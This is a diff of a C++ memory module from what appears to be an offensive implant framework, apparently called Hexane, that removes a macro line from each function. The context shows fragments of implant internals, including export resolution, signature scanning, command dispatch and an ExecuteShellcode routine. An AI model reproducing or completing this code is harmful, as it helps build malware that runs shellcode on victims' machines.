@@ -1,7 +1,6 @@
 #include <core/include/memory.hpp>
 
 void* operator new(size_t size) {
-    HEXANE
 
     void *ptr = nullptr;
     if (Ctx->heap && Ctx->nt.RtlAllocateHeap) {
@@ -16,7 +15,6 @@ void* operator new(size_t size) {
 }
 
 void operator delete(void* ptr) noexcept {
-    HEXANE
 
     if (Ctx->heap && Ctx->nt.RtlFreeHeap && ptr) {
         if (!Ctx->nt.RtlFreeHeap(Ctx->heap, 0, ptr)) {
@@ -38,13 +36,11 @@ namespace Memory {
     namespace Methods {
 
         UINT_PTR GetInternalAddress(uint32_t name) {
-            HEXANE
 
             return 1;
         }
 
         UINT_PTR GetStackCookie() {
-            HEXANE
 
             uintptr_t cookie = 0;
             if (!NT_SUCCESS(Ctx->nt.NtQueryInformationProcess(NtCurrentProcess(), S_CAST(PROCESSINFOCLASS, 0x24), &cookie, 0x4, nullptr))) {
@@ -54,7 +50,6 @@ namespace Memory {
         }
 
         _resource* GetIntResource(HMODULE base, const int rsrc_id) {
-            HEXANE
 
             HRSRC       res_info    = { };
             _resource   *object     = { };
@@ -70,7 +65,6 @@ namespace Memory {
         }
 
         _executable* CreateImageData(uint8_t *data) {
-            HEXANE
 
             _executable *image = R_CAST(_executable*, x_malloc(sizeof(_executable)));
 
@@ -180,7 +174,6 @@ namespace Memory {
         }
 
         UINT_PTR LoadExport(const char* const module_name, const char* const export_name) {
-            HEXANE
 
             uintptr_t   symbol = 0;
             int         reload = 0;
@@ -205,7 +198,6 @@ namespace Memory {
     namespace Scanners {
 
         UINT_PTR RelocateExport(void* const process, const void* const target, size_t size) {
-            HEXANE
 
             uintptr_t   ret     = 0;
             const auto  address = R_CAST(uintptr_t, target);
@@ -229,7 +221,6 @@ namespace Memory {
         }
 
         UINT_PTR SignatureScan(void* process, const uintptr_t start, const uint32_t size, const char* signature, const char* mask) {
-            HEXANE
 
             size_t      read    = 0;
             uintptr_t   address = 0;
@@ -255,7 +246,6 @@ namespace Memory {
     namespace Execute {
 
         BOOL ExecuteCommand(_parser &parser) {
-            HEXANE
 
             const auto  cmd_id      = Parser::UnpackDword(&parser);
             _command    cmd         = { };
@@ -276,7 +266,6 @@ namespace Memory {
         }
 
         BOOL ExecuteShellcode(const _parser& parser) {
-            HEXANE
 
             void    (*exec)()   = { };
             void    *address    = { };
